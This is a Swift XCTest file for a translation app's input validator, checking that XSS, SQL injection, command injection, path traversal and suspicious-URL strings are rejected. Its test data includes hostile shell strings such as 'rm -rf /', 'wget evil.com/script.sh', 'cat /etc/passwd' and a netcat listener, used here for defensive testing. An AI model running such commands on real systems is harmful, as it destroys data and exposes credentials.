//\n//  InputValidatorTests.swift\n//  UniversalTranslatorTests\n//\n//  Comprehensive test suite for InputValidator covering attack pattern detection,\n//  sanitization, validation rules, and security edge cases.\n//\n\nimport XCTest\nimport Foundation\n@testable import UniversalTranslator\n\nclass InputValidatorTests: XCTestCase {\n    var validator: InputValidator!\n    \n    override func setUp() {\n        super.setUp()\n        validator = InputValidator.shared\n    }\n    \n    override func tearDown() {\n        validator = nil\n        super.tearDown()\n    }\n    \n    // MARK: - Basic Text Validation Tests\n    \n    func testValidTextInput() {\n        // Given\n        let validTexts = [\n            \"Hello, world!\",\n            \"This is a normal sentence with punctuation.\",\n            \"Multiple languages: Hola, Bonjour, „Åì„Çì„Å´„Å°„ÅØ\",\n            \"Numbers and symbols: 123 @#$%^&*()_+-=[]{}|;':\"\",./<>?\",\n            \"Emojis are valid too! üòÄüåçüöÄ\"\n        ]\n        \n        // When & Then\n        for text in validTexts {\n            XCTAssertNoThrow(try validator.validateTranslationText(text), \"Failed to validate: \\(text)\")\n        }\n    }\n    \n    func testEmptyTextValidation() {\n        // Given\n        let emptyTexts = [\n            \"\",\n            \"   \",\n            \"\\t\\n  \\r\",\n            \"\\n\\n\\n\"\n        ]\n        \n        // When & Then\n        for text in emptyTexts {\n            XCTAssertThrowsError(try validator.validateTranslationText(text)) { error in\n                if case ValidationError.emptyInput = error {\n                    // Expected\n                } else {\n                    XCTFail(\"Expected emptyInput error for: \\(text)\")\n                }\n            }\n        }\n    }\n    \n    func testTextLengthValidation() {\n        // Given\n        let tooLongText = String(repeating: \"a\", count: 10001) // Over limit\n        \n        // When & Then\n        XCTAssertThrowsError(try validator.validateTranslationText(tooLongText)) { error in\n            if case ValidationError.tooLong(let maxLength) = error {\n                XCTAssertEqual(maxLength, 10000)\n            } else {\n                XCTFail(\"Expected tooLong error\")\n            }\n        }\n    }\n    \n    // MARK: - XSS Attack Detection Tests\n    \n    func testXSSScriptTagDetection() {\n        // Given\n        let xssPayloads = [\n            \"<script>alert('XSS')</script>\",\n            \"<SCRIPT>alert('XSS')</SCRIPT>\",\n            \"<script src='evil.js'></script>\",\n            \"<script type='text/javascript'>maliciousCode();</script>\",\n            \"Hello <script>alert('embedded')</script> world\"\n        ]\n        \n        // When & Then\n        for payload in xssPayloads {\n            XCTAssertThrowsError(try validator.validateTranslationText(payload)) { error in\n                if case ValidationError.potentialXSSAttack = error {\n                    // Expected\n                } else if case ValidationError.potentialCommandInjection = error {\n                    // Also acceptable for critical severity\n                } else {\n                    XCTFail(\"Expected XSS-related error for: \\(payload), got: \\(error)\")\n                }\n            }\n        }\n    }\n    \n    func testXSSEventHandlerDetection() {\n        // Given\n        let eventHandlers = [\n            \"<img onload='alert(1)'>\",\n            \"<div onclick='malicious()'>\",\n            \"<input onerror='evil()' />\",\n            \"<body onload='attack()'>\",\n            \"<p onmouseover='harmful()'>\"\n        ]\n        \n        // When & Then\n        for handler in eventHandlers {\n            XCTAssertThrowsError(try validator.validateTranslationText(handler)) { error in\n                XCTAssertTrue(\n                    error is ValidationError,\n                    \"Expected ValidationError for: \\(handler)\"\n                )\n            }\n        }\n    }\n    \n    func testJavaScriptProtocolDetection() {\n        // Given\n        let jsProtocols = [\n            \"javascript:alert('XSS')\",\n            \"JAVASCRIPT:evil()\",\n            \"javascript: alert(1)\",\n            \"<a href='javascript:void(0)'>Click</a>\"\n        ]\n        \n        // When & Then\n        for protocol in jsProtocols {\n            XCTAssertThrowsError(try validator.validateTranslationText(protocol)) { error in\n                XCTAssertTrue(\n                    error is ValidationError,\n                    \"Expected ValidationError for: \\(protocol)\"\n                )\n            }\n        }\n    }\n    \n    // MARK: - SQL Injection Detection Tests\n    \n    func testSQLInjectionKeywords() {\n        // Given\n        let sqlInjections = [\n            \"'; DROP TABLE users; --\",\n            \"1' OR '1'='1\",\n            \"admin'; DELETE FROM accounts; --\",\n            \"UNION SELECT password FROM users\",\n            \"INSERT INTO evil VALUES ('hacked')\",\n            \"UPDATE users SET admin=1 WHERE id=1\"\n        ]\n        \n        // When & Then\n        for injection in sqlInjections {\n            XCTAssertThrowsError(try validator.validateTranslationText(injection)) { error in\n                if case ValidationError.potentialSQLInjection = error {\n                    // Expected\n                } else if case ValidationError.maliciousPattern = error {\n                    // Also acceptable\n                } else {\n                    XCTFail(\"Expected SQL injection error for: \\(injection), got: \\(error)\")\n                }\n            }\n        }\n    }\n    \n    func testSQLCommentDetection() {\n        // Given\n        let sqlComments = [\n            \"test' -- comment\",\n            \"input'; --\",\n            \"value /* comment */\",\n            \"data; SELECT * FROM\"\n        ]\n        \n        // When & Then\n        for comment in sqlComments {\n            XCTAssertThrowsError(try validator.validateTranslationText(comment)) { error in\n                XCTAssertTrue(\n                    error is ValidationError,\n                    \"Expected ValidationError for: \\(comment)\"\n                )\n            }\n        }\n    }\n    \n    // MARK: - Command Injection Detection Tests\n    \n    func testCommandInjectionDetection() {\n        // Given\n        let commandInjections = [\n            \"; rm -rf /\",\n            \"| cat /etc/passwd\",\n            \"&& wget evil.com/script.sh\",\n            \"`curl malicious.site`\",\n            \"$(cat secret.txt)\",\n            \"test; ls -la\",\n            \"input && chmod 777 file\"\n        ]\n        \n        // When & Then\n        for injection in commandInjections {\n            XCTAssertThrowsError(try validator.validateTranslationText(injection)) { error in\n                if case ValidationError.potentialCommandInjection = error {\n                    // Expected\n                } else if case ValidationError.maliciousPattern = error {\n                    // Also acceptable\n                } else {\n                    XCTFail(\"Expected command injection error for: \\(injection), got: \\(error)\")\n                }\n            }\n        }\n    }\n    \n    func testShellCommandDetection() {\n        // Given\n        let shellCommands = [\n            \"rm important.txt\",\n            \"cat /etc/passwd\",\n            \"wget http://evil.com/malware\",\n            \"curl -X POST http://attacker.com\",\n            \"nc -l -p 4444\",\n            \"telnet evil.server.com\"\n        ]\n        \n        // When & Then\n        for command in shellCommands {\n            XCTAssertThrowsError(try validator.validateTranslationText(command)) { error in\n                XCTAssertTrue(\n                    error is ValidationError,\n                    \"Expected ValidationError for: \\(command)\"\n                )\n            }\n        }\n    }\n    \n    // MARK: - Path Traversal Detection Tests\n    \n    func testPathTraversalDetection() {\n        // Given\n        let pathTraversals = [\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\",\n            \"/var/www/../../../etc/shadow\",\n            \"file:///../../../secret.txt\",\n            \"....//....//....//etc/passwd\"\n        ]\n        \n        // When & Then\n        for traversal in pathTraversals {\n            XCTAssertThrowsError(try validator.validateTranslationText(traversal)) { error in\n                XCTAssertTrue(\n                    error is ValidationError,\n                    \"Expected ValidationError for: \\(traversal)\"\n                )\n            }\n        }\n    }\n    \n    // MARK: - Malicious URL Detection Tests\n    \n    func testSuspiciousURLDetection() {\n        // Given\n        let suspiciousURLs = [\n            \"file:///etc/passwd\",\n            \"ftp://evil.server.com/malware\",\n            \"http://localhost:8080/admin\",\n            \"https://127.0.0.1/backdoor\",\n            \"http://0.0.0.0/exploit\"\n        ]\n        \n        // When & Then\n        for url in suspiciousURLs {\n            XCTAssertThrowsError(try validator.validateTranslationText(url)) { error in\n                if case ValidationError.maliciousPattern = error {\n                    // Expected\n                } else {\n                    XCTFail(\"Expected maliciousPattern error for: \\(url), got: \\(error)\")\n                }\n            }\n        }\n    }\n    \n    // MARK: - Control Character Detection Tests\n    \n    func testControlCharacterDetection() {\n        // Given\n        let controlCharacters = [\n            \"Hello\\0World\", // Null byte\n            \"Test\\x01Data\", // Start of heading\n            \"Input\\x1FValue\", // Unit separator\n            \"Evil\\x7FCode\", // Delete\n            \"Bad\\x9FContent\" // Application program command\n        ]\n        \n        // When & Then\n        for text in controlCharacters {\n            let testData = Data(text.utf8)\n            let testString = String(data: testData, encoding: .utf8) ?? \"\"\n            \n            if !testString.isEmpty {\n                XCTAssertThrowsError(try validator.validateTranslationText(testString)) { error in\n                    if case ValidationError.maliciousPattern = error {\n                        // Expected\n                    } else {\n                        XCTFail(\"Expected maliciousPattern error for control character test\")\n                    }\n                }\n            }\n        }\n    }\n    \n    // MARK: - Language Code Validation Tests\n    \n    func testValidLanguageCodes() {\n        // Given\n        let validCodes = [\"en\", \"es\", \"fr\", \"de\", \"ja\", \"ko\", \"zh\", \"ar\", \"ru\", \"hi\"]\n        \n        // When & Then\n        for code in validCodes {\n            XCTAssertNoThrow(try validator.validateLanguageCode(code), \"Failed to validate: \\(code)\")\n        }\n    }\n    \n    func testInvalidLanguageCodes() {\n        // Given\n        let invalidCodes = [\"xx\", \"invalid\", \"123\", \"en-us\", \"ESP\", \"\"]\n        \n        // When & Then\n        for code in invalidCodes {\n            XCTAssertThrowsError(try validator.validateLanguageCode(code)) { error in\n                XCTAssertTrue(\n                    error is ValidationError,\n                    \"Expected ValidationError for: \\(code)\"\n                )\n            }\n        }\n    }\n    \n    func testLanguageCodeCaseInsensitivity() {\n        // Given\n        let mixedCaseCodes = [\"EN\", \"Es\", \"FR\", \"De\", \"JA\"]\n        \n        // When & Then\n        for code in mixedCaseCodes {\n            XCTAssertNoThrow(try validator.validateLanguageCode(code), \"Failed to validate: \\(code)\")\n        }\n    }\n    \n    // MARK: - Audio Data Validation Tests\n    \n    func testValidAudioData() {\n        // Given\n        let validAudioHeaders = [\n            Data([0x66, 0x74, 0x79, 0x70]) + Data(repeating: 0x00, count: 1000), // M4A\n            Data([0x49, 0x44, 0x33]) + Data(repeating: 0x00, count: 1000),       // MP3\n            Data([0xFF, 0xFB]) + Data(repeating: 0x00, count: 1000),             // MP3\n            Data([0x52, 0x49, 0x46, 0x46]) + Data(repeating: 0x00, count: 1000), // WAV\n            Data([0x4F, 0x67, 0x67, 0x53]) + Data(repeating: 0x00, count: 1000)  // OGG\n        ]\n        \n        // When & Then\n        for audioData in validAudioHeaders {\n            XCTAssertNoThrow(try validator.validateAudioData(audioData), \"Failed to validate valid audio data\")\n        }\n    }\n    \n    func testInvalidAudioData() {\n        // Given\n        let invalidAudioData = [\n            Data(), // Empty\n            Data([0x00, 0x01, 0x02, 0x03]), // Invalid header\n            Data(repeating: 0xFF, count: 100), // No valid header\n            Data([0x48, 0x65, 0x6C, 0x6C, 0x6F]) // \"Hello\" as bytes\n        ]\n        \n        // When & Then\n        for audioData in invalidAudioData {\n            XCTAssertThrowsError(try validator.validateAudioData(audioData)) { error in\n                XCTAssertTrue(\n                    error is ValidationError,\n                    \"Expected ValidationError for invalid audio data\"\n                )\n            }\n        }\n    }\n    \n    func testAudioDataSizeLimit() {\n        // Given\n        let oversizedAudioData = Data(repeating: 0x66, count: 51 * 1024 * 1024) // 51MB, over limit\n        \n        // When & Then\n        XCTAssertThrowsError(try validator.validateAudioData(oversizedAudioData)) { error in\n            if case ValidationError.fileTooLarge(let maxSize) = error {\n                XCTAssertEqual(maxSize, 50 * 1024 * 1024) // 50MB limit\n            } else {\n                XCTFail(\"Expected fileTooLarge error\")\n            }\n        }\n    }\n    \n    // MARK: - Sanitization Tests\n    \n    func testTextSanitization() {\n        // Given\n        let dirtyTexts = [\n            (\"<script>alert('xss')</script>\", \"&lt;script&gt;alert(&#x27;xss&#x27;)&lt;&#x2F;script&gt;\"),\n            (\"Hello & goodbye\", \"Hello &amp; goodbye\"),\n            (\"Quote: \\\"test\\\"\", \"Quote: &quot;test&quot;\"),\n            (\"Path: /etc/passwd\", \"Path: &#x2F;etc&#x2F;passwd\"),\n            (\"Less < than > greater\", \"Less &lt; than &gt; greater\")\n        ]\n        \n        // When & Then\n        for (input, expected) in dirtyTexts {\n            let sanitized = validator.sanitizeText(input)\n            XCTAssertEqual(sanitized, expected, \"Sanitization failed for: \\(input)\")\n        }\n    }\n    \n    func testControlCharacterRemoval() {\n        // Given\n        let textWithControlChars = \"Hello\\tWorld\\nWith\\rControl\\x01Characters\"\n        \n        // When\n        let sanitized = validator.sanitizeText(textWithControlChars)\n        \n        // Then\n        XCTAssertFalse(sanitized.contains(\"\\t\"))\n        XCTAssertFalse(sanitized.contains(\"\\n\"))\n        XCTAssertFalse(sanitized.contains(\"\\r\"))\n        XCTAssertEqual(sanitized, \"HelloWorldWithControlCharacters\")\n    }\n    \n    func testWhitespaceNormalization() {\n        // Given\n        let texts = [\n            (\"  leading spaces\", \"leading spaces\"),\n            (\"trailing spaces  \", \"trailing spaces\"),\n            (\"  both ends  \", \"both ends\"),\n            (\"\\t\\n mixed \\r\\n whitespace \\t\", \"mixed  whitespace\")\n        ]\n        \n        // When & Then\n        for (input, expected) in texts {\n            let sanitized = validator.sanitizeText(input)\n            XCTAssertEqual(sanitized.trimmingCharacters(in: .whitespacesAndNewlines), expected)\n        }\n    }\n    \n    func testUnicodeNormalization() {\n        // Given\n        let unicodeTexts = [\n            \"caf√©\", // Composed\n            \"cafe\\u{0301}\", // Decomposed\n            \"Œ©\", // Greek omega\n            \"Œ©\", // Ohm sign (different Unicode point)\n            \"üá∫üá∏\" // Flag emoji\n        ]\n        \n        // When & Then\n        for text in unicodeTexts {\n            let sanitized = validator.sanitizeText(text)\n            XCTAssertEqual(sanitized, text.precomposedStringWithCanonicalMapping)\n        }\n    }\n    \n    // MARK: - Rate Limiting Tests\n    \n    func testRateLimitingBasic() {\n        // Given\n        let identifier = \"test-user-1\"\n        \n        // When & Then - Should not be rate limited initially\n        XCTAssertFalse(validator.shouldRateLimit(identifier: identifier))\n        \n        // Simulate many requests quickly\n        for _ in 0..<60 {\n            _ = validator.shouldRateLimit(identifier: identifier)\n        }\n        \n        // Should now be rate limited\n        XCTAssertTrue(validator.shouldRateLimit(identifier: identifier))\n    }\n    \n    func testRateLimitingPerUser() {\n        // Given\n        let user1 = \"user-1\"\n        let user2 = \"user-2\"\n        \n        // When - Exhaust rate limit for user1\n        for _ in 0..<61 {\n            _ = validator.shouldRateLimit(identifier: user1)\n        }\n        \n        // Then\n        XCTAssertTrue(validator.shouldRateLimit(identifier: user1))\n        XCTAssertFalse(validator.shouldRateLimit(identifier: user2)) // user2 should be fine\n    }\n    \n    // MARK: - Suspicious Activity Detection Tests\n    \n    func testExcessiveRepetitionDetection() {\n        // Given\n        let repetitiveText = String(repeating: \"a\", count: 15) // More than 10 consecutive chars\n        \n        // When & Then\n        XCTAssertThrowsError(try validator.validateTranslationText(repetitiveText)) { error in\n            if case ValidationError.suspiciousActivity = error {\n                // Expected\n            } else {\n                XCTFail(\"Expected suspiciousActivity error for repetitive text\")\n            }\n        }\n    }\n    \n    func testNormalRepetitionAllowed() {\n        // Given\n        let normalText = \"Hello, I really, really love this app!\" // Normal repetition\n        \n        // When & Then\n        XCTAssertNoThrow(try validator.validateTranslationText(normalText))\n    }\n    \n    func testValidUnicodeHandling() {\n        // Given\n        let unicodeTexts = [\n            \"Hello ‰∏ñÁïå\", // Chinese\n            \"–ü—Ä–∏–≤–µ—Ç –º–∏—Ä\", // Russian\n            \"ŸÖÿ±ÿ≠ÿ®ÿß ÿ®ÿßŸÑÿπÿßŸÑŸÖ\", // Arabic\n            \"„Åì„Çì„Å´„Å°„ÅØ‰∏ñÁïå\", // Japanese\n            \"üåçüöÄüí´\" // Emojis\n        ]\n        \n        // When & Then\n        for text in unicodeTexts {\n            XCTAssertNoThrow(try validator.validateTranslationText(text), \"Failed to validate Unicode text: \\(text)\")\n        }\n    }\n    \n    // MARK: - Edge Cases and Boundary Tests\n    \n    func testBoundaryLengthTexts() {\n        // Given\n        let exactLimitText = String(repeating: \"a\", count: 10000) // Exact limit\n        let justOverLimitText = String(repeating: \"b\", count: 10001) // Just over limit\n        \n        // When & Then\n        XCTAssertNoThrow(try validator.validateTranslationText(exactLimitText))\n        XCTAssertThrowsError(try validator.validateTranslationText(justOverLimitText))\n    }\n    \n    func testMixedAttackPatterns() {\n        // Given\n        let mixedAttacks = [\n            \"<script>alert('XSS')</script>'; DROP TABLE users; --\",\n            \"javascript:alert(1); rm -rf /\",\n            \"<img onerror='evil()' src='x' /> UNION SELECT password\"\n        ]\n        \n        // When & Then\n        for attack in mixedAttacks {\n            XCTAssertThrowsError(try validator.validateTranslationText(attack)) { error in\n                XCTAssertTrue(\n                    error is ValidationError,\n                    \"Expected ValidationError for mixed attack: \\(attack)\"\n                )\n            }\n        }\n    }\n    \n    func testCaseInsensitiveAttackDetection() {\n        // Given\n        let caseVariations = [\n            \"<SCRIPT>alert('XSS')</SCRIPT>\",\n            \"UNION SELECT * FROM users\",\n            \"JAVASCRIPT:alert(1)\",\n            \"; RM -RF /\"\n        ]\n        \n        // When & Then\n        for variation in caseVariations {\n            XCTAssertThrowsError(try validator.validateTranslationText(variation)) { error in\n                XCTAssertTrue(\n                    error is ValidationError,\n                    \"Expected ValidationError for case variation: \\(variation)\"\n                )\n            }\n        }\n    }\n    \n    func testEncodedAttackDetection() {\n        // Note: Current implementation doesn't decode, but we test the principle\n        // Given\n        let potentialEncodedAttacks = [\n            \"&lt;script&gt;alert(1)&lt;/script&gt;\", // HTML encoded\n            \"%3Cscript%3Ealert(1)%3C/script%3E\", // URL encoded\n        ]\n        \n        // When & Then - These should pass through (not decoded and detected)\n        for attack in potentialEncodedAttacks {\n            // Current implementation doesn't decode, so these pass\n            // In a real implementation, you might want to decode first\n            XCTAssertNoThrow(try validator.validateTranslationText(attack))\n        }\n    }\n    \n    // MARK: - Performance Tests\n    \n    func testValidationPerformance() {\n        // Given\n        let testTexts = (0..<100).map { \"Test message number \\($0) with some content\" }\n        \n        // When & Then\n        measure {\n            for text in testTexts {\n                _ = try? validator.validateTranslationText(text)\n            }\n        }\n    }\n    \n    func testSanitizationPerformance() {\n        // Given\n        let testTexts = (0..<100).map { \"Message \\($0): <script>alert('test')</script>\" }\n        \n        // When & Then\n        measure {\n            for text in testTexts {\n                _ = validator.sanitizeText(text)\n            }\n        }\n    }\n    \n    // MARK: - String Extension Tests\n    \n    func testStringSafetyCheck() {\n        // Given\n        let safeTexts = [\n            \"Normal text\",\n            \"Text with numbers 123\",\n            \"Punctuation! @#$%^&*()\"\n        ]\n        \n        let unsafeTexts = [\n            \"Text with \\0 null byte\",\n            \"Control \\x01 character\"\n        ]\n        \n        // When & Then\n        for text in safeTexts {\n            XCTAssertTrue(text.isSafe, \"Text should be considered safe: \\(text)\")\n        }\n        \n        for text in unsafeTexts {\n            if let safeString = String(validatingUTF8: text.cString(using: .utf8) ?? []) {\n                XCTAssertFalse(safeString.isSafe, \"Text should be considered unsafe: \\(text)\")\n            }\n        }\n    }\n    \n    func testStringSanitizationExtension() {\n        // Given\n        let dirtyText = \"<script>alert('test')</script>\"\n        \n        // When\n        let sanitized = dirtyText.sanitized\n        \n        // Then\n        XCTAssertEqual(sanitized, \"&lt;script&gt;alert(&#x27;test&#x27;)&lt;&#x2F;script&gt;\")\n    }\n}\n"